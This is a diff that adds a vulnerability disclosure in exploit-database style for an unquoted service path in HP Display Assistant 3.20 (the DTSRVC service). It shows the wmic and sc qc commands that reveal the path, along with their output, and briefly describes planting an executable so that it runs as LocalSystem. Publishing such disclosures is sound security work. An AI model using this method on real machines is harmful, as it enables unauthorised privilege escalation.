@@ -1,0 +1,39 @@
+# Exploit Title: HP Display Assistant x64 Edition 3.20 - 'DTSRVC' Unquoted Service Path
+# Date: 2020-11-08
+# Exploit Author: Julio Aviña
+# Vendor Homepage: https://www.portrait.com/
+# Software Link: https://www.portrait.com/dtune/hwp/enu/
+# Software Version: 3.20
+# File Version: 1.0.0.1
+# Tested on: Windows 10 Pro x64 es
+# Vulnerability Type: Unquoted Service Path
+
+
+# 1. To find the unquoted service path vulnerability
+
+C:\>wmic service where 'name like "%DTSRVC%"' get name, displayname, pathname, startmode, startname
+
+DisplayName                             Name    PathName                                                                 StartMode  StartName
+Portrait Displays Display Tune Service  DTSRVC  C:\Program Files (x86)\Common Files\Portrait Displays\Shared\dtsrvc.exe  Auto       LocalSystem
+
+# 2. To check service info:
+
+C:\>sc qc "DTSRVC"
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: DTSRVC
+        TIPO               : 10  WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: C:\Program Files (x86)\Common Files\Portrait Displays\Shared\dtsrvc.exe
+        GRUPO_ORDEN_CARGA  :
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : Portrait Displays Display Tune Service
+        DEPENDENCIAS       :
+        NOMBRE_INICIO_SERVICIO: LocalSystem
+
+
+# 3. Exploit:
+
+A successful attempt to exploit this vulnerability requires the attacker to insert an executable file into the service path undetected by the OS or some security application.
+When restarting the service or the system, the inserted executable will run with elevated privileges.
